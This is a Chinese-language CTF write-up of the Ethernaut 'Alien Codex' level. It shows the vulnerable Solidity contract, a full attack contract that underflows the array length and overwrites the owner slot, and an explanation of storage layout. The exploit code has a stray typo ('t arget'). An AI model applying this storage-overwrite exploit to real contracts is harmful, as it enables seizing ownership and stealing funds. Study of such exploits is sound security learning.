# 19-Alien Codex

日期: 22/08/2024
难易: 超纲
漏洞小结: 数组向下溢出
简单明了: 旧版本向下漏出以及利用

# 问题描述

You've uncovered an Alien contract. Claim ownership to complete the level.

Things that might help

- Understanding how array storage works
- Understanding [ABI specifications](https://solidity.readthedocs.io/en/v0.4.21/abi-spec.html)
- Using a very `underhanded` approach

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.5.0;

import "../helpers/Ownable-05.sol";

contract AlienCodex is Ownable {
    bool public contact;
    bytes32[] public codex;

    modifier contacted() {
        assert(contact);
        _;
    }

    function makeContact() public {
        contact = true;
    }

    function record(bytes32 _content) public contacted {
        codex.push(_content);
    }

    function retract() public contacted {
        codex.length--;
    }

    function revise(uint256 i, bytes32 _content) public contacted {
        codex[i] = _content;
    }
}
```

# 攻击思路

- 看到0.5.0应该是这个版本的古早漏洞
- 查了一下是数组向下溢出，溢出的数组的长度和合约的存储长度一样
    - 因为是继承，所以ownable里面，owner在slot0，并且只有一个bit的contract也在slot0
    - 因为长度一样，所以这个数组的某个位置和slot0会重合
    - 通过revise合约去写前slot0重合的位置，修改owner的值就可以了
    - 如何计算的方式水平不够，看看大神的分析，在攻击代码里面

# 攻击方式

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8;

interface IAlienCodex {
    function owner() external view returns (address);
    function codex(uint256) external view returns (bytes32);
    function retract() external;
    function makeContact() external;
    function revise(uint256 i, bytes32 _content) external;
}

contract AttackAlienCode {
    /*
    storage
    slot 0 - owner (20 bytes), contact (1 byte)
    slot 1 - length of the array codex

    // slot where array element is stored = keccak256(slot)) + index
    // h = keccak256(1)
    slot h + 0 - codex[0] 
    slot h + 1 - codex[1] 
    slot h + 2 - codex[2] 
    slot h + 3 - codex[3] 

    Find i such that
    slot h + i = slot 0
    h + i = 0 so i = 0 - h
    */
    constructor(IAlienCodex target) {
        t arget.makeContact();
        target.retract();

        uint256 h = uint256(keccak256(abi.encode(uint256(1))));
        uint256 i;
        unchecked {
            // h + i = 0 = 2**256
            i -= h;
        }

        target.revise(i, bytes32(uint256(uint160(msg.sender))));
        require(target.owner() == msg.sender, "hack failed");
    }
}
```

# Ethernuat总结

This level exploits the fact that the EVM doesn't validate an array's ABI-encoded length vs its actual payload.

Additionally, it exploits the arithmetic underflow of array length, by expanding the array's bounds to the entire storage area of `2^256`. The user is then able to modify all contract storage.

Both vulnerabilities are inspired by 2017's [Underhanded coding contest](https://medium.com/@weka/announcing-the-winners-of-the-first-underhanded-solidity-coding-contest-282563a87079)

# 小白的思考

- CTF向的题目，比较古早，现在应该已经没有这个问题了，但是能把这个东西研究明白真是个天才
- 了解一下slot数组是怎么存放值的
- 要知道如何计算，然后调用就可以了
- 向下溢出需要使用`unchecked`关键词
    
    ```solidity
            unchecked {
                // h + i = 0 = 2**256
                i -= h;
            }
    ```
    

还有一个很重要的点，之前做privacy合约的时候也是个数组，那时候是在别的变量之后连续的，但是这个却需要使用keccak256(slot)来计算，这个点需要搞清楚一下。Refer to GPT

## 固定大小数组 vs 动态数组

这是一个关键的 Solidity 存储机制差异点。`Privacy` 合约中的 `data` 数组和 `AlienCodex` 合约中的 `codex` 数组，虽然都是数组，但它们的存储方式在底层有所不同。我们来详细分析：

### 1. 固定大小数组 vs 动态数组：

- 在 `Privacy` 合约中，`data` 是一个 **固定大小** 的 `bytes32[3]` 数组。
    
    固定大小的数组直接将其元素紧挨着存储在连续的存储槽中。由于 `data` 有 3 个元素，它们会依次占据 `slot 3`, `slot 4`, 和 `slot 5`。这就是为什么在 `Privacy` 合约中，你可以简单地通过固定偏移量访问它们。
    
- 在 `AlienCodex` 合约中，`codex` 是一个 **动态大小** 的 `bytes32[]` 数组。
    
    动态数组的存储方式不同，数组的元素不会直接紧挨着存储，而是从一个计算出的槽位开始。这种计算需要用到 `keccak256` 哈希函数。
    

### 2. 为什么需要 `keccak256(slot)` 计算？

动态数组存储的数据是通过哈希计算来定位的。原因在于，动态数组的长度是可变的，无法直接用固定的槽位置表示。因此：

- 数组的长度本身存储在对应的槽中（在 `AlienCodex` 中，`codex` 的长度存储在 `slot 1`）。
- 实际数据的位置是从 `keccak256(slot)` 计算出来的存储槽开始，确保数组的数据和长度是分开的。`keccak256(1)` 的哈希结果表示数组数据的起始存储槽。

### 3. 为什么固定大小的数组不需要哈希计算？

固定大小的数组在编译时就已经确定了长度，因此 Solidity 编译器可以直接将它们的元素存储在连续的存储槽中，而无需额外计算起始槽位。这是它们和动态数组的最大区别。

---

综上，`Privacy` 中的 `data` 和 `AlienCodex` 中的 `codex` 是不同类型的数组，因此它们的存储方式不同。如果还有疑问，可以继续探讨！